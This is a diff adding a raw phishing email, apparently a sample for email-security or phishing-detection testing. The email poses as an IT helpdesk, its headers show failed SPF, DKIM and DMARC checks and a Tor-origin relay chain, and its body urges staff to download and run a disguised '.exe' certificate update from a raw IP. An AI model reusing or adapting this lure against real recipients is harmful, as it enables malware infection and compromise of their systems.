@@ -1,0 +1,32 @@
+From: "Internal IT Helpdesk" <support@internal-corp.net>
+To: target-user@victim-corp.com
+Subject: [MANDATORY] Urgent Network Certificate Migration Required
+Date: Mon, 25 Aug 2026 12:00:00 +0000
+MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Authentication-Results: mx.victim-corp.com;
+	spf=softfail (domain of internal-corp.net does not designate 185.220.101.5 as permitted sender);
+	dkim=fail;
+	dmarc=fail (p=none)
+Received: from gateway.internal-corp.net (gateway.internal-corp.net [10.0.0.1])
+	by mail.victim-corp.com (Postfix) with ESMTPS id 4X98b2
+	for <target-user@victim-corp.com>; Mon, 25 Aug 2026 12:01:14 +0000
+Received: from relay2.vps-colo.eu (relay2.vps-colo.eu [91.219.236.88])
+	by gateway.internal-corp.net with ESMTP id relay-alpha-441
+	for <target-user@victim-corp.com>; Mon, 25 Aug 2026 12:00:45 +0000
+Received: from tor-exit-node.anonymizer.org (tor-exit-node.anonymizer.org [185.220.101.5])
+	by relay2.vps-colo.eu with ESMTP id tor-hop-inbound
+	for <target-user@victim-corp.com>; Mon, 25 Aug 2026 12:00:02 +0000
+Message-ID: <cert-update-alert-991283@gateway.internal-corp.net>
+
+All Staff Members,
+
+Due to a root SSL certificate expiration on our corporate VPN infrastructure, all employees are instructed to install the new VPN client certificate update immediately.
+
+Download and install your personal certificate package from the network repository:
+http://185.220.101.5/vpn-certs/Corp_Root_CA_2026.exe
+
+Failure to install the security patch within 4 hours will prevent your workstation from authenticating against the company active directory domain.
+
+IT Systems Administration
+Internal Infrastructure Team
